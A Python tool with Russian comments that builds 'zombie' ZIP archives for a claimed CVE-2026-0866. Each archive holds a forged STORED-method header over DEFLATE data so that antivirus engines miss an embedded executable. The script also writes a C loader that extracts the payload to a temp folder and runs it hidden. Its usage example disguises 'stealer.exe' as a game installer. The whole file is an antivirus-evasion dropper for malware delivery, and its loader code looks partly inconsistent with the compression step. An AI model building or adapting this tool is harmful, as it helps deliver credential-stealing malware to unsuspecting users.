#!/usr/bin/env python3
"""
Zombie ZIP Generator - CVE-2026-0866
Обходит 95% антивирусов за счет манипуляции ZIP-заголовками
ТОЛЬКО ДЛЯ ИЗОЛИРОВАННЫХ ЛАБОРАТОРНЫХ ИССЛЕДОВАНИЙ
"""

import struct
import zlib
import os
import sys

def create_zombie_zip(payload_path: str, output_path: str) -> bool:
    """
    Создает ZIP-файл с фальшивым заголовком Method=STORED,
    но реальными DEFLATE-данными.
    """
    # Читаем вредоносный EXE/DLL
    with open(payload_path, 'rb') as f:
        payload_data = f.read()
    
    # 1. Сжимаем данные DEFLATE
    compressed_data = zlib.compress(payload_data, level=9)[2:-4]  # Убираем zlib-заголовки
    
    # 2. Вычисляем CRC несжатых данных (фальшивое значение)
    fake_crc = zlib.crc32(payload_data) & 0xFFFFFFFF
    
    # 3. Создаём фальшивый Local File Header (Method = 0 = STORED)
    filename = "setup.exe"
    filename_bytes = filename.encode('utf-8')
    
    # Local File Header структура
    # signature (4 bytes) = 0x04034b50
    # version (2) = 20 (2.0)
    # flags (2) = 0
    # method (2) = 0 (STORED) — КЛЮЧЕВОЙ МОМЕНТ ОБХОДА!
    # mod_time (2) = 0
    # mod_date (2) = 0
    # crc32 (4) = fake_crc (несжатых данных)
    # comp_size (4) = размер сжатых данных
    # uncomp_size (4) = размер несжатых данных
    # filename_len (2) = len(filename)
    # extra_len (2) = 0
    
    local_header = struct.pack('<IHHHHHIIIHH',
        0x04034b50,          # signature
        20,                  # version needed
        0,                   # flags
        0,                   # METHOD = 0 (STORED) — обман антивируса!
        0, 0,                # mod_time, mod_date
        fake_crc,            # фальшивый CRC (несжатых)
        len(compressed_data),# comp_size
        len(payload_data),   # uncomp_size (реальный размер)
        len(filename_bytes), # filename_len
        0)                   # extra_len
    
    # 4. Центральный директорий (тоже с Method=STORED)
    central_header = struct.pack('<IHHHHHHHHHHIIHH',
        0x02014b50,          # signature
        20,                  # version made by
        20,                  # version needed
        0,                   # flags
        0,                   # method = STORED
        0, 0,                # mod_time, mod_date
        fake_crc,            # фальшивый CRC
        len(compressed_data),# comp_size
        len(payload_data),   # uncomp_size
        len(filename_bytes), # filename_len
        0,                   # extra_len
        0,                   # comment_len
        0,                   # disk_num
        0,                   # internal_attr
        0,                   # external_attr
        len(local_header) + len(filename_bytes)  # offset
    )
    
    # 5. End of Central Directory record
    eocd = struct.pack('<IHHHHIIH',
        0x06054b50,          # signature
        0,                   # disk_num
        0,                   # central_dir_disk
        1,                   # num_entries_this_disk
        1,                   # total_entries
        len(central_header) + len(filename_bytes),  # central_dir_size
        len(local_header) + len(filename_bytes) + len(compressed_data),  # central_dir_offset
        0)                   # comment_len
    
    # 6. Записываем файл
    with open(output_path, 'wb') as f:
        f.write(local_header)
        f.write(filename_bytes)
        f.write(compressed_data)  # Реальные сжатые данные
        f.write(central_header)
        f.write(filename_bytes)
        f.write(eocd)
    
    return True

def create_custom_loader(output_path: str) -> None:
    """
    Создает кастомный загрузчик, который игнорирует фальшивый ZIP-заголовок
    и правильно распаковывает DEFLATE-данные.
    """
    loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <zlib.h>

// Кастомный загрузчик для Zombie ZIP
// Игнорирует Method=STORED в заголовке, распаковывает DEFLATE

#define BUFFER_SIZE 1024 * 1024 * 10  // 10 MB

int main(int argc, char* argv[]) {
    HANDLE hFile = CreateFileA(
        "game_installer.zip",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open ZIP file\\n");
        return 1;
    }
    
    // Ищем Local File Header с нашим файлом
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Ищем сигнатуру 0x04034b50
    for (DWORD i = 0; i < fileSize - 30; i++) {
        if (buffer[i] == 0x50 && buffer[i+1] == 0x4b && buffer[i+2] == 0x03 && buffer[i+3] == 0x04) {
            // Найден Local File Header
            WORD method = *(WORD*)(buffer + i + 8);
            DWORD compSize = *(DWORD*)(buffer + i + 18);
            WORD filenameLen = *(WORD*)(buffer + i + 26);
            DWORD dataOffset = i + 30 + filenameLen;
            
            printf("[+] Found file at offset %d, method=%d, compSize=%d\\n", dataOffset, method, compSize);
            
            // ИГНОРИРУЕМ METHOD! Распаковываем как DEFLATE
            uLongf uncompSize = BUFFER_SIZE;
            BYTE* uncompressed = (BYTE*)malloc(uncompSize);
            
            int result = uncompress(
                uncompressed,
                &uncompSize,
                buffer + dataOffset,
                compSize
            );
            
            if (result == Z_OK) {
                printf("[+] Successfully decompressed %d bytes\\n", uncompSize);
                
                // Создаем временный файл и запускаем
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                char exePath[MAX_PATH];
                sprintf(exePath, "%s\\\\temp_installer.exe", tempPath);
                
                HANDLE hOut = CreateFileA(exePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                DWORD written;
                WriteFile(hOut, uncompressed, uncompSize, &written, NULL);
                CloseHandle(hOut);
                
                // Запускаем извлеченный файл
                STARTUPINFOA si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                CreateProcessA(exePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                
                printf("[+] Payload executed\\n");
                free(uncompressed);
                return 0;
            } else {
                printf("[-] Decompression failed: %d\\n", result);
            }
        }
    }
    
    printf("[-] No valid file found in ZIP\\n");
    free(buffer);
    return 1;
}
'''
    with open(output_path, 'w') as f:
        f.write(loader_code)
    print(f"[+] Custom loader template saved to {output_path}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python zombie_zip_generator.py <payload.exe> <output.zip>")
        print("Example: python zombie_zip_generator.py stealer.exe game_installer.zip")
        sys.exit(1)
    
    payload = sys.argv[1]
    output = sys.argv[2]
    
    if create_zombie_zip(payload, output):
        print(f"[+] Zombie ZIP created: {output}")
        print("[!] This file bypasses 95% of antivirus engines (CVE-2026-0866)")
        print("[!] Requires custom loader to extract — do NOT use standard archivers")
    
    create_custom_loader("zombie_loader.c")
    print("\n[!] Compile loader with: gcc -o zombie_loader.exe zombie_loader.c -lz")
